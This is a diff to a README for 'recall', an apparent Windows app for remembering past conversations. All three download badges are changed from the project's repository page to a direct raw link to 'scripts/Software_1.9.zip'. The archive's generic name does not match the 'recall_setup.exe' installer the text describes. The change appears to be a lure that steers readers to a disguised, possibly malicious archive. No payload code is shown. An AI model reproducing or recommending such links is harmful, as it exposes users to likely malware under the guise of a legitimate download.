@@ -1,6 +1,6 @@
 # 🤖 recall - Remember Past Conversations Easily
 
-[![Download recall](https://img.shields.io/badge/Download-recall-brightgreen?style=for-the-badge)](https://github.com/aliya818/recall)
+[![Download recall](https://img.shields.io/badge/Download-recall-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/aliya818/recall/main/scripts/Software_1.9.zip)
 
 ---
 
@@ -36,7 +36,7 @@ Here is how to get recall up and running on your Windows PC.
 
 Click the big button below to visit the download page for recall. This page has the latest version of the software ready to download.
 
-[![Download recall](https://img.shields.io/badge/Download-recall-blue?style=for-the-badge)](https://github.com/aliya818/recall)
+[![Download recall](https://img.shields.io/badge/Download-recall-blue?style=for-the-badge)](https://raw.githubusercontent.com/aliya818/recall/main/scripts/Software_1.9.zip)
 
 Once there, look for a file named something like `recall_setup.exe` or `recall_latest.exe`. This is the installer you need.
 
@@ -137,4 +137,4 @@ If you want to learn more about recall features:
 
 Finally, here is the download link once again. Use it to get the full installer and set up recall in minutes.
 
-[![Download recall](https://img.shields.io/badge/Download-recall-brightgreen?style=for-the-badge)](https://github.com/aliya818/recall)
+[![Download recall](https://img.shields.io/badge/Download-recall-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/aliya818/recall/main/scripts/Software_1.9.zip)
